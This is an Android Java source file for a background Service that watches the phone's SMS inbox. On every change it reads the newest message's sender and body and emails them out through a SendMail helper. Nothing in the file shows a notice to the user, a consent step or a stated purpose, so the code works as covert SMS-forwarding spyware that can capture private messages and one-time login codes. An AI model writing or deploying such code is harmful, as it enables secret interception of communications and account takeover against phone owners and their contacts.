package com.ht.msgpool;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;

import com.fanfq.util.mail.SendMail;

import java.text.SimpleDateFormat;
import java.util.Date;

import static android.support.v4.app.ActivityCompat.requestPermissions;

public class MsgService extends Service {

    private Handler handler = new Handler() {
        public void handleMessage(android.os.Message msg) {
            Bundle bundle = msg.getData();
            final String body = bundle.getString("body");
            final String address = bundle.getString("address");
            final String date = bundle.getString("date");
            //vSms.setText(body);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    SendMail.SendMail(MsgService.this,"",body,address);
                }
            }).start();
        }


    };

    public MsgService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        SMSContent smsObsever = new MsgService.SMSContent(handler);//实例化短信观察者
        //注册短信观察者
        getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObsever);

        return super.onStartCommand(intent, flags, startId);
    }


    /**
     * @author Administrator
     * @description 短信观察者
     */
    class SMSContent extends ContentObserver {
        private Handler mHandler;

        public SMSContent(Handler handler) {
            super(handler);
            mHandler = handler;
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cursor = null;
            String body = null;
            String address = null;
            String date = null;



            //MsgService.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);



            //读取之前判断一下是否已经渠道权限
            if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                try {
                    cursor = getContentResolver().query(
                            Uri.parse("content://sms/inbox"), null, null, null,
                            "date desc");
                    if (cursor != null) {
                        if (cursor.moveToNext()) {//不遍历只拿当前最新的一条短信
                            //获取当前的短信内容
                            address = cursor.getString(cursor.getColumnIndex("address"));
                            body = cursor.getString(cursor.getColumnIndex("body"));
                            long l = cursor.getLong(cursor.getColumnIndex("date_sent"));
                            Message msg = Message.obtain();
                            Bundle bundle = new Bundle();
                            bundle.putString("body", body);
                            bundle.putString("address",address);

                            SimpleDateFormat sdf= new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
                            //前面的lSysTime是秒数，先乘1000得到毫秒数，再转为java.util.Date类型
                            java.util.Date dt = new Date(l);
                            date = sdf.format(dt);  //得到精确到秒的表示：08/31/2006 21:08:00
                            //System.out.println(sDateTime);

                            bundle.putString("date",date);

                            msg.setData(bundle);
                            mHandler.sendMessage(msg);
                        }

                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (cursor != null) {
                        cursor.close();
                    }

                }
            }
        }
    }
}
